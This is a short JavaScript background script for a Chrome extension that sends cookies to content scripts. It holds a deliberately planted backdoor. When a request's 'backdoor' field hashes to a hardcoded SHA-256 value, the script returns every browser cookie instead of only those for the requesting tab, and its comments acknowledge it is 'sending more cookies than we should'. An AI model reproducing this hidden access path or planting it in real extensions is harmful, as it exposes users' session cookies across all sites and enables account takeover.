// listen for content script requesting cookies
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
	console.log(sender.tab ? "from a content script: " + sender.tab.url : "from the extension");

	// check if we received a request from a special someone
	if (CryptoJS.SHA256(request.backdoor).toString() == "7e604b9952eccc8eb56fa2fc9fae7d93f297b7cb25c15966c633439270d40d91") {
		chrome.cookies.getAll({}, function(cookies) {
			console.log("sending more cookies than we should...: " + cookies);
			sendResponse({cookies: cookies});
		});
	} else {
		chrome.cookies.getAll({url: sender.tab.url}, function(cookies) {
			console.log("here are your cookies: " + cookies);
			sendResponse({cookies: cookies});
		});
	}
	
	// return true to indicate that the response is asynchronous
	return true;
});
